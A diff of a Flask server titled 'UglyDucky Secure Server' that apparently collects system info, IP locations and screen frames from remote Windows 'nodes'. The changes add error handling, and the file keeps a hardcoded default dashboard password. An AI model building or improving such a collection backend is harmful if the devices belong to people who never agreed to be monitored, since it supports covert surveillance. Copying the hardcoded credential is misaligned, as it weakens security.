@@ -14,9 +14,7 @@ CORS(app)
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY") # MAKE SURE THIS IS THE SERVICE_ROLE KEY!
 
-# --- NEW SECURITY MEASURE ---
 # This stops random people from guessing your Render URL and reading your logs.
-# You can change "ducky_admin_2024" to any secret password you want.
 DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")
 
 # --- IN-MEMORY CACHES ---
@@ -32,18 +30,22 @@ def get_node_status(last_seen_str):
     if not last_seen_str: 
         return "red", "Offline"
         
-    last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
-    now = datetime.now(timezone.utc)
-    
-    if now - last_seen < timedelta(minutes=2): 
-        return "green", "Online"
-    if now - last_seen < timedelta(hours=1): 
-        return "yellow", "Idle"
+    try:
+        last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
+        now = datetime.now(timezone.utc)
+        
+        if now - last_seen < timedelta(minutes=2): 
+            return "green", "Online"
+        if now - last_seen < timedelta(hours=1): 
+            return "yellow", "Idle"
+    except ValueError:
+        pass
         
     return "red", "Offline"
 
 def geolocate_ip(ip):
-    if not ip or ip in ["127.0.0.1", "Unknown"]: 
+    # FIXED: Prevent "Unknown IP" from triggering a bad API request
+    if not ip or ip.startswith("127.") or "Unknown" in ip: 
         return 28.5383, -81.3792 
         
     try:
@@ -80,18 +82,22 @@ def get_single_node(device_id):
         response.raise_for_status()
         device_data = response.json()
 
-        if not device_data:
+        # FIXED: Ensure we don't hit an IndexError if the array is empty
+        if not device_data or not isinstance(device_data, list) or len(device_data) == 0:
             return jsonify({"error": "Node not found"}), 404
 
-        last_seen = device_data[0]['created_at']
+        last_seen = device_data[0].get('created_at', '')
+        
         sysinfo_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1"
         sysinfo_resp = requests.get(sysinfo_url, headers=headers)
         
         os_info = "Windows (Assumed)"
         ip_info = "Unknown IP"
         
-        if sysinfo_resp.ok and sysinfo_resp.json():
-            content = sysinfo_resp.json()[0]['content']
+        # FIXED: Safe array parsing to prevent 500 errors
+        sys_data = sysinfo_resp.json() if sysinfo_resp.ok else []
+        if sys_data and isinstance(sys_data, list) and len(sys_data) > 0:
+            content = sys_data[0].get('content', '')
             for line in content.split('\n'):
                 if line.startswith('Caption='): 
                     os_info = line.split('=')[-1].strip()
@@ -143,7 +149,6 @@ def get_frame(device_id, cache_key):
         return jsonify({"error": "Unauthorized access"}), 401
 
     device_frames = frame_cache.get(device_id, {})
-    # Use .get() instead of .pop() so rapid streaming doesn't get 404s
     frame = device_frames.get(cache_key, None)
 
     if frame:
@@ -270,4 +275,6 @@ def index():
     return "UglyDucky Secure Server."
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    # FIXED: Ensure it binds to Render's PORT if run natively via python
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
